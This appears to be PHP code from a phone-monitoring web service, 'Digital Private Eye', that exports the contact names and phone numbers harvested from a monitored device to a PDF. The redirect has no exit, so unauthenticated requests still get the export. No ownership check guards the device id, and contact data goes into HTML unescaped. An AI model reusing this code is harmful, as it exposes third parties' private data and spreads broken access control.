<?php
session_start();
if(!$_SESSION['user_id'])
    header("Location: sign-in.php");

if (file_exists('tcpdf/tcpdf.php')) {
    require_once('tcpdf/tcpdf.php');// Include the main TCPDF library (search for installation path).
    include("logic/Devices.php");

    $devicesModel = new Devices();
    $deviceId = $_GET['device'];
    $contacts = $devicesModel->getDeviceAllContacts($_GET['device']);
    $deviceInfo =  $devicesModel->getDeviceInfo($deviceId);
    $deviceDescription = $deviceInfo['description'];
    $application_website_name = 'Digital Private Eye';
    $application_name = 'Digital Private Eye';
    $date = gmdate("F j, Y, g:i a");

    $pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);
    $pdf->SetCreator(PDF_CREATOR);
    $pdf->SetAuthor($application_name);
    $pdf->SetTitle($deviceDescription);
    $pdf->SetSubject($deviceDescription);
    $pdf->SetKeywords($application_name);
    $pdf->SetHeaderData("../../../img/logo.png", 15, $deviceDescription."'s Contacts (".$date." GMT)",
        "Powered by Digital Private Eye (www.digitalprivateeye.com)", array(104,182,4), array(104,182,4));
    $pdf->setFooterData(array(0,0,0),array(104,182,4) );
    $pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
    $pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));
    $pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);
    $pdf->SetMargins(PDF_MARGIN_LEFT, 25, PDF_MARGIN_RIGHT);
    $pdf->SetHeaderMargin(5);
    $pdf->SetFooterMargin(20);
    $pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
    $pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);

    if (@file_exists(dirname(__FILE__).'tcpdf/examples/lang/eng.php')) {
        require_once(dirname(__FILE__).'tcpdf/examples/lang/eng.php');
        $pdf->setLanguageArray($l);
    }

    $pdf->setFontSubsetting(true);
    $pdf->SetFont('dejavusans', '', 10, '', true);
    $pdf->AddPage();
    $output = "";
    $output = $output . "<p><table  border=\"0.1\"  cellpadding=\"3\">";
    $output = $output . "<tr><td style='padding-right:20px;'><strong>Name</strong></td><td style='padding-right:20px;'><strong>Telephone Number</strong></td></tr>";

    foreach($contacts as $contact)
    {
        $name = $contact['name'];
        $telephoneNo = $contact['telephone_number'];
        $output = $output . "<tr><td style='padding-right:20px;'>$name</td><td style='padding-right:20px;'>$telephoneNo</td></tr>";
    }
    $output = $output . "</table></p>";

    // Set some content to print
    $html = $output;

    // Print text using writeHTMLCell()
    $pdf->writeHTMLCell(0, 0, '', '', $html, 0, 1, 0, true, '', true);

    ob_end_clean();
    $pdf->Output($deviceDescription.'_Contacts.pdf', 'I');

}
else{
    echo "Unable to download pdf file.</br></br> Missing tdcpdf.</br></br>".getcwd();
}